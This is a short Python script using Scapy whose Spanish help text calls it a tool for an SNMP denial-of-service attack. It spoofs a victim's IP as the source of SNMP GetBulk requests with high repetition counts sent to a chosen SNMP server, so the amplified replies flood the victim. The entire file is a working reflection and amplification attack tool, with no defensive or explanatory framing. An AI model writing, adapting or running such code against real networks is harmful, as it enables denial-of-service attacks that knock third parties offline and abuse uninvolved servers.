#!/usr/bin/python



from scapy.all import *

import logging
import argparse
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

parser = argparse.ArgumentParser(description="Script para hacer ataque Dos por SNMP")

parser.add_argument('-P', '--IP_USER', help="IP de la victima", required=True, dest='USER')
parser.add_argument('-D', '--IP_SNMP', help="IP de maquina que retornara la consulta", required=True, dest='DEST')
parser.add_argument('-n', '--ITERATIONS', help="Numero de paquetes", required=True,dest='NUMBER')

args = parser.parse_args()


bulk = SNMPbulk(max_repetitions = 50, varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.2.1.1')), SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))])

snmp = SNMP(PDU=bulk)

print 'Iniciando Dos a IP' + args.USER

request = sr1(IP(src=args.USER, dst=args.DEST)/UDP(dport=161,sport=161)/snmp, count=args.NUMBER)




